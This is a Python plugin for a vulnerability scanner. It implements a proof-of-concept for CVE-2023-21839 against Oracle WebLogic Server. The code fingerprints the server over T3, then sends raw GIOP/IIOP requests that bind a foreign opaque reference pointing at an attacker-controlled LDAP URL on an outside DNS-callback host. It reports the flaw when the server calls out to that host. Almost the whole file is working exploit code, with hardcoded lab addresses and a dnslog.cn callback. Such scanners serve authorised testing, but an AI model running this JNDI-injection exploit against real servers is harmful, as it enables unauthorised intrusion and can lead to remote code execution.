#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2023-21839
# updated 24/1/20
# referer: https://github.com/houqe/POC_CVE-2023-21839

import pathlib
import re
import socket
import sys
import time
from typing import Any, Tuple

try:
    from utils import PLUGIN_TYPE, plugin, urlutil
except:
    sys.path.append(pathlib.Path(__file__).parent.parent.__str__())
    from utils import PLUGIN_TYPE, plugin, urlutil


class Plugin(plugin.PluginBase):
    def set_info(self):
        return {
            'name': 'Oracle WebLogic Server Core information disclosure',
            'catalog': 'CVE-2023-21839',
            'itype': PLUGIN_TYPE.POC,
            'protocols': ['t3'],
            'port': '7001',
        }

    def run(self, url: urlutil.Url, timeout=5, *args, **kwargs) -> Tuple[bool, Any]:
        try:
            self.tcp.connect()
        except socket.timeout:
            return False, 'connection timeout.'
        except ConnectionRefusedError:
            return False, 'connection refuse.'
        s_time = time.time()
        err, b_response = self.tcp.rq(
            b't3 9.2.0.0\nAS:255\nHL:92\nMS:10000000\nPU:t3://127.0.0.1:7001\n\n', timeout=timeout
        )
        if err:
            return False, err
        r_version = re.search(rb'HELO:(\d+.\d+.\d+.\d+)', b_response)
        if not r_version:
            return False, 'product version not found.'
        version = r_version.group(1)

        self.tcp.close()
        self.tcp = self.cli_mng.new_tcp(url.host, url.i_port)
        try:
            self.tcp.connect()
        except socket.timeout:
            return False, 'connection timeout.'
        except ConnectionRefusedError:
            return False, 'connection refuse.'
        info = self.make_dns_echo()
        if not info:
            return False, 'requires dns type reflection.'
        ldap = 'ldap://{}.{}'.format(info['rid'], info['netloc'])
        b_ldap = len(ldap).to_bytes(1, 'big') + ldap.encode()

        s_time = time.time()
        err, b_response = self.tcp.rq(
            b'GIOP\x01\x02\x00\x03\x00\x00\x00\x17\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x0bNameService',
            timeout=timeout,
        )
        if err:
            return False, err

        r_response = re.search(b'[^\x00]+\x00+', b_response[0x60:])
        if not r_response:
            return False, 'unknown error.'
        ioff = 0x60 + len(r_response.group(0)) + 1
        lt = ioff - 0x60
        foff = 0x60 + lt + 0x75
        r_response = re.search(b'\x00+', b_response[foff:])
        if not r_response:
            return False, 'unknown error.'
        foff += len(r_response.group(0))

        key_a = b_response[foff : foff + 8]
        key_b = b'\xff\xff\xff\xff' + b_response[foff + 4 : foff + 8]
        if version.startswith(b'12'):
            wls_key_a = (
                b'\x00BEA\x08\x01\x03\x00\x00\x00\x00\x0cAdminServer\x00\x00\x00\x00\x00\x00\x00\x003IDL:weblogic/corba/cos/naming/NamingContextAny:1.0\x00\x00\x00\x00\x00\x028\x00\x00\x00\x00\x00\x00\x01BEA,\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00'
                + key_a
            )
        elif version.startswith(b'14'):
            wls_key_a = (
                b'\x00BEA\x08\x01\x03\x00\x00\x00\x00\x0cAdminServer\x00\x00\x00\x00\x00\x00\x00\x003IDL:weblogic/corba/cos/naming/NamingContextAny:1.0\x00\x00\x00\x00\x00\x028\x00\x00\x00\x00\x00\x00\x01BEA.\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00'
                + key_a
            )
        else:
            return False, 'product version mismatch.'
        data = (
            b'\x00\x00\x00\x03\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x'
            + wls_key_a
            + b'\x00\x00\x00\x0brebind_any\x00\x00\x00\x00\x00\x06\x00\x00\x00\x05\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\r172.26.112.1\x00\x00\xec[\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x01\x00 \x05\x01\x00\x01\x00\x00\x00\x06\x00\x00\x00\xf4\x00\x00\x00\x00\x00\x00\x00(IDL:omg.org/SendingContext/CodeBase:1.0\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x01\x02\x00\x00\x00\x00\r172.26.112.1\x00\x00\xec[\x00\x00\x00d\x00BEA\x08\x01\x03\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00(IDL:omg.org/SendingContext/CodeBase:1.0\x00\x00\x00\x00\x0312\x00\x00\x00\x00\x00\x01BEA*\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00^\xed\xaf\xde\xbc\r"p\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00,\x00\x00\x00\x00\x00\x01\x00 \x00\x00\x00\x03\x00\x01\x00 \x00\x01\x00\x01\x05\x01\x00\x01\x00\x01\x01\x00\x00\x00\x00\x03\x00\x01\x01\x00\x00\x01\x01\t\x05\x01\x00\x01\x00\x00\x00\x0f\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00BEA\x03\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00'
            + key_b
            + b'\x00\x00\x00\x00BEA\x00\x00\x00\x00\x04\x00\n\x03\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04test\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x1d\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7f\xff\xff\x02\x00\x00\x00TRMI:weblogic.jndi.internal.ForeignOpaqueReference:D237D91CB2F0F68A:3D21527FED596EF1\x00\x00\x00\x00\x00\x7f\xff\xff\x02\x00\x00\x00#IDL:omg.org/CORBA/WStringValue:1.0\x00\x00\x00\x00\x00'
            + b_ldap
        )
        err, b_response = self.tcp.rq(b'GIOP\x01\x02\x00\x00' + len(data).to_bytes(4, 'big') + data, timeout=timeout)
        if err:
            return False, err

        start_off = 0x64 + lt + 0xC0 + len('192.168.245.128') + 0xAC + lt + 0x5D
        while start_off < len(b_response):
            if start_off > 0x2710 or b_response[start_off] == 0x32:
                break
            start_off += 1
        if start_off > 0x2710:
            key_c = b'\x32\x38\x39\x00'
        else:
            key_c = b_response[start_off : start_off + 4]
        wls_key_b = (
            b'\x00BEA\x08\x01\x03\x00\x00\x00\x00\x0cAdminServer\x00\x00\x00\x00\x00\x00\x00\x003IDL:weblogic/corba/cos/naming/NamingContextAny:1.0\x00\x00\x00\x00\x00\x04'
            + key_c
            + b'\x00\x00\x00\x01BEA,\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00'
            + key_a
        )
        if version.startswith(b'14'):
            wls_key_b = (
                b'\x00BEA\x08\x01\x03\x00\x00\x00\x00\x0cAdminServer\x00\x00\x00\x00\x00\x00\x00\x003IDL:weblogic/corba/cos/naming/NamingContextAny:1.0\x00\x00\x00\x00\x00\x04'
                + key_c
                + b'\x00\x00\x00\x01BEA.\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00'
                + key_a
            )

        data = (
            b'\x00\x00\x00\x04\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x'
            + wls_key_b
            + b'\x00\x00\x00\x0brebind_any\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\r172.26.112.1\x00\x00\xec[\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x01\x00 \x05\x01\x00\x01BEA\x03\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00'
            + key_b
            + b'\x00\x00\x00\x00BEA\x00\x00\x00\x00\x04\x00\n\x03\x01\x00\x00\x00\x01\x00\x00\x00\x04test\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x1d\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7f\xff\xff\x02\x00\x00\x00TRMI:weblogic.jndi.internal.ForeignOpaqueReference:D237D91CB2F0F68A:3D21527FED596EF1\x00\x00\x00\x00\x00\x7f\xff\xff\x02\x00\x00\x00#IDL:omg.org/CORBA/WStringValue:1.0\x00\x00\x00\x00\x00'
            + b_ldap
        )
        err, b_response = self.tcp.rq(b'GIOP\x01\x02\x00\x00' + len(data).to_bytes(4, 'big') + data, timeout=timeout)
        if err:
            return False, err
        err, b_response = self.tcp.rq(
            b'GIOP\x01\x02\x00\x03\x00\x00\x00\x17\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x0bNameService',
            timeout=timeout,
        )
        if err:
            return False, err
        err, b_response = self.tcp.rq(
            b'GIOP\x01\x02\x00\x00\x00\x00\x01\x11\x00\x00\x00\x06\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x'
            + wls_key_a
            + b'\x00\x00\x00\x08resolve\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\r172.26.112.1\x00\x00\xec[\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x01\x00 \x05\x01\x00\x01BEA\x03\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00'
            + key_b
            + b'\x00\x00\x00\x00BEA\x00\x00\x00\x00\x04\x00\n\x03\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05test\x00\x00\x00\x00\x00\x00\x00\x01\x00',
            timeout=timeout,
        )
        if err:
            return False, err
        err, b_response = self.tcp.rq(
            b'GIOP\x01\x02\x00\x00\x00\x00\x01\x11\x00\x00\x00\x07\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x'
            + wls_key_b
            + b'\x00\x00\x00\x08resolve\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\r172.26.112.1\x00\x00\xec[\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x01\x00 \x05\x01\x00\x01BEA\x03\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00'
            + key_b
            + b'\x00\x00\x00\x00BEA\x00\x00\x00\x00\x04\x00\n\x03\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05test\x00\x00\x00\x00\x00\x00\x00\x01\x00',
            timeout=timeout,
        )
        if err:
            return False, err
        ret = self.get_results(info['rid'])
        return len(ret) > 0, ret


if __name__ == '__main__':
    import time

    from utils import net_echo

    nc = net_echo.DnslogCn()
    nc.start_service()
    plugin = Plugin(nc)

    s_time = time.time()
    ret = plugin.do_testing('192.168.245.128')
    print(ret)
    print(ret['is_exists'])
    print('total time(s):', time.time() - s_time)
